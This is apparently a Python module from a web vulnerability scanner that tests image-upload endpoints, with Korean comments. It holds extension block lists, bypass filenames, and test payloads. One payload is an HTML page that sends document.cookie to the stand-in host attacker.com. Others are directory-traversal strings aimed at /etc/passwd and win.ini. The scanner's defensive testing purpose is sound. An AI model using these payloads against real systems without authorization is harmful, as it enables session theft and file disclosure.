"""Security rules and payloads for 2-1 Malicious File Upload Scan."""

from typing import FrozenSet, List, Optional, Tuple

# ── 허용 확장자 화이트리스트 (이미지 전용 엔드포인트 기준) ──────────────────────
# 향후 다른 엔드포인트(문서 업로드 등) 지원 시 이 목록을 동적으로 교체할 수 있습니다.
ALLOWED_IMAGE_EXTENSIONS: FrozenSet[str] = frozenset({
    "jpg", "jpeg", "png", "gif", "webp", "bmp", "tiff", "tif", "ico", "avif", "heic", "heif",
})

# ── 위험 확장자 블랙리스트 ────────────────────────────────────────────────────
# 서버가 이 확장자의 파일을 수락(200/201)하면 확장자 검증 미비 취약점으로 판정합니다.
DANGEROUS_EXTENSIONS: FrozenSet[str] = frozenset({
    # 서버사이드 스크립트 (RCE 위험)
    "jsp", "jspx", "php", "php3", "php4", "php5", "phtml",
    "asp", "aspx", "ashx", "axd",
    "cfm", "cfc", "pl", "py", "rb", "sh", "bash",
    # 실행 파일
    "exe", "dll", "bat", "cmd", "com", "msi", "ps1",
    # 브라우저 실행 가능 파일 (XSS/CSRF 위험)
    "html", "htm", "xhtml", "shtml",
    "svg",          # <script> 포함 시 XSS 가능
    "xml",          # XXE 가능
    "js", "mjs",   # JavaScript
    "vbs", "vbe",  # VBScript
    # 압축/패키지 (내부 페이로드 포함 가능)
    "zip", "tar", "gz", "jar", "war", "ear",
})

# ── 이중 확장자 우회 탐지용 패턴 ─────────────────────────────────────────────
# 서버가 마지막 확장자만 검사할 경우 우회될 수 있는 패턴
DOUBLE_EXT_DANGEROUS_PATTERNS: List[str] = [
    ".php.", ".jsp.", ".asp.", ".html.", ".svg.",
]


def get_file_extension(filename: str) -> str:
    """파일명의 마지막 확장자를 소문자로 반환합니다."""
    name = filename.lower().strip()
    # URL 인코딩된 null byte, 퍼센트 인코딩 등을 제거하고 확장자 추출
    clean_name = name.split("%00")[0].split("\x00")[0]
    if "." in clean_name:
        return clean_name.rsplit(".", 1)[-1]
    return ""


def get_all_extensions(filename: str) -> List[str]:
    """파일명에서 모든 확장자를 소문자 목록으로 반환합니다 (이중 확장자 탐지용)."""
    name = filename.lower().strip().split("%00")[0]
    parts = name.split(".")
    return [p for p in parts[1:] if p]  # 첫 번째 부분(basename)은 제외


def is_dangerous_extension(
    filename: str,
    allowed_extensions: Optional[FrozenSet[str]] = None,
) -> bool:
    """
    파일명이 위험한 확장자를 포함하는지 확인합니다.

    Args:
        filename: 검사할 파일명
        allowed_extensions: 허용할 확장자 집합. None이면 DANGEROUS_EXTENSIONS 기준으로 판단.

    Returns:
        True이면 위험한 확장자 (서버가 차단해야 함)
    """
    last_ext = get_file_extension(filename)
    all_exts = get_all_extensions(filename)

    if allowed_extensions is not None:
        # 화이트리스트 기반: 마지막 확장자가 허용 목록에 없으면 위험
        return last_ext not in allowed_extensions
    else:
        # 블랙리스트 기반: 어느 확장자라도 위험 목록에 있으면 위험
        return any(ext in DANGEROUS_EXTENSIONS for ext in all_exts)


def has_double_extension_bypass(filename: str) -> bool:
    """이중 확장자 우회 패턴이 포함되어 있는지 확인합니다."""
    name_lower = filename.lower()
    return any(pat in name_lower for pat in DOUBLE_EXT_DANGEROUS_PATTERNS)


# ── 파일 업로드 공격 페이로드 ─────────────────────────────────────────────────
# Format: (filename, content (bytes), content_type, attack_desc)
FILE_UPLOAD_PAYLOADS: List[Tuple[str, bytes, str, str]] = [
    (
        "exploit.html",
        b'<html><body><script>document.location="http://attacker.com/?c="+document.cookie</script></body></html>',
        "image/jpeg",
        "HTML 파일 (XSS)",
    ),
    (
        "shell.jsp",
        b'<%@ page import="java.io.*" %><% out.println("UPLOAD_TEST"); %>',
        "image/jpeg",
        "JSP 웹셸",
    ),
    (
        "shell.jspx",
        b'<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="2.1">'
        b'<jsp:directive.page contentType="text/html" pageEncoding="UTF-8"/>'
        b'<jsp:scriptlet>out.println("UPLOAD_TEST_JSPX");</jsp:scriptlet>'
        b'</jsp:root>',
        "image/jpeg",
        "JSPX 웹셸",
    ),
    (
        "test.php",
        b'<?php echo "UPLOAD_TEST_PHP"; ?>',
        "image/jpeg",
        "PHP 웹셸",
    ),
    (
        "eicar.com",
        b'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*',
        "application/octet-stream",
        "EICAR 안티바이러스 테스트 파일",
    ),
    (
        "svg_script.svg",
        b'<?xml version="1.0" standalone="no"?>\n'
        b'<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" '
        b'"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">\n'
        b'<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">\n'
        b'  <script type="text/javascript">\n'
        b'    alert("SVG XSS");\n'
        b'  </script>\n'
        b'</svg>',
        "image/svg+xml",
        "SVG XSS 페이로드",
    ),
    (
        "fake_image.jpg.php",
        b'<?php echo "UPLOAD_TEST_PHP"; ?>',
        "image/jpeg",
        "이중 확장자 우회 (.jpg.php)",
    ),
    (
        "fake_image.php.jpg",
        b'<?php echo "UPLOAD_TEST_PHP"; ?>',
        "image/jpeg",
        "이중 확장자 우회 (.php.jpg)",
    ),
    (
        "null_byte.jpg%00.php",
        b'<?php echo "UPLOAD_TEST_PHP"; ?>',
        "image/jpeg",
        "Null-Byte 삽입 (%00)",
    ),
    (
        "semicolon_bypass.jsp;.jpg",
        b'<%@ page import="java.io.*" %><% out.println("UPLOAD_TEST"); %>',
        "image/jpeg",
        "세미콜론(;) 확장자 파싱 우회",
    ),
    (
        "percent_bypass.jsp%20",
        b'<%@ page import="java.io.*" %><% out.println("UPLOAD_TEST"); %>',
        "image/jpeg",
        "퍼센트(%) 및 공백 확장자 파싱 우회",
    ),
]

DIRECTORY_TRAVERSAL_PAYLOADS: List[Tuple[str, str]] = [
    ("../../../../../../../../etc/passwd", "디렉터리 트래버셜 (Linux 기본 ../)"),
    ("..\\..\\..\\..\\..\\..\\..\\windows\\win.ini", "디렉터리 트래버셜 (Windows 기본 ..\\)"),
    ("././././././././etc/passwd", "디렉터리 트래버셜 (./ 필터 우회 테스트)"),
    (".._\\.._\\.._\\windows\\win.ini", "디렉터리 트래버셜 (_\\ 필터 우회 테스트)"),
    (".\\.\\.\\windows\\win.ini", "디렉터리 트래버셜 (.\\ 필터 우회 테스트)"),
    ("..%2f..%2f..%2fetc%2fpasswd", "디렉터리 트래버셜 (URL 인코딩 % 우회)"),
]


def get_upload_payloads() -> List[Tuple[str, bytes, str, str]]:
    return FILE_UPLOAD_PAYLOADS


def get_traversal_payloads() -> List[Tuple[str, str]]:
    return DIRECTORY_TRAVERSAL_PAYLOADS
